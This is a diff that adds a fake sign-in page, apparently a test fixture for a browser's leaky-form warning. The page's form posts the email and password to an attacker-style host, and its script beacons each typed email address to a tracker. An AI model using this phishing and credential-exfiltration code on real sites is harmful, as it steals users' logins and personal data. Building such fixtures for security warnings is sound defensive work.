@@ -1,0 +1,16 @@
+<!doctype html><meta charset="utf-8"><title>Sign in</title>
+<h1>Secure account login</h1>
+<form id="f" action="http://evil-collector.tk/grab" method="post">
+  <input type="email" id="email" name="email" placeholder="email">
+  <input type="password" name="pw" placeholder="password">
+  <button type="submit">Log in</button>
+</form>
+<script>
+  // Warned page + a third-party beacon on the typed email: the leaky-form toast is allowed here.
+  document.getElementById('email').addEventListener('input', function (e) {
+    var v = e.target.value;
+    if (v.indexOf('@') !== -1) {
+      try { navigator.sendBeacon('https://tracker.example:5601/collect?e=' + encodeURIComponent(v)); } catch (_) {}
+    }
+  });
+</script>
